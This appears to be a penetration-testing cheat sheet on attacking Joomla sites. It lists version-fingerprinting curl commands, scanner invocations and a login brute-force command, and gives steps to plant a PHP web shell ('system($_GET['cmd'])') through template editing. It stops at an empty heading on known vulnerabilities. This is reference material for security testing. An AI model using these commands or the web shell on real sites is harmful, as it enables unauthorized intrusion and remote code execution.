# Joomla

{% hint style="info" %}
* A free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more. It is written in PHP and uses MySQL in the backend. Like WordPress, Joomla can be enhanced with over 7,000 extensions and over 1,000 templates.
* Joomla collects some anonymous [usage statistics](https://developer.joomla.org/about/stats.html) such as the breakdown of Joomla, PHP and database versions and server operating systems in use on Joomla installations. This data can be queried via their public [API](https://developer.joomla.org/about/stats/api.html)
{% endhint %}

## Discovery/Footprinting <a href="#discoveryfootprinting" id="discoveryfootprinting"></a>

* `curl -s http://<URL> | grep Joomla`&#x20;
* The `robots.txt` file for a Joomla site will reveal further details.
* We can fingerprint the Joomla version if the `README.txt` file is present.
  * `curl -s http://<URL>/README.txt | head -n 5`&#x20;
* In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.
  * `curl -s http://<URL>/administrator/manifests/files/joomla.xml | xmllint --format`&#x20;
* The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`.

## Enumeration <a href="#joomla-discovery-enumeration" id="joomla-discovery-enumeration"></a>

* [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
  * `droopescan scan joomla --url <value>`&#x20;
* [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool.
  * `python2 joomlascan.py -u http://<value>`&#x20;

## Exploitation

### Login Bruteforce <a href="#login-bruteforce" id="login-bruteforce"></a>

* [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce) - `sudo python3 joomla-brute.py -u http://<URL> -w http_default_pass.txt -usr admin`

### Abusing Built-In Functionality <a href="#abusing-built-in-functionality" id="abusing-built-in-functionality"></a>

* Add a snippet of PHP code to gain RCE by customizing a template.
* Click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
* Click on a template name. This will bring us to the `Templates: Customise` page.
* Click on a page to pull up the page source.
* Add a PHP one-liner to gain code execution.
  * `system($_GET['cmd']);`
* Click on `Save & Close` at the top and confirm code execution using `cURL`.
  * `curl -s <URL>/error.php?cmd=id`&#x20;

### Leveraging Known Vulnerabilities <a href="#leveraging-known-vulnerabilities" id="leveraging-known-vulnerabilities"></a>
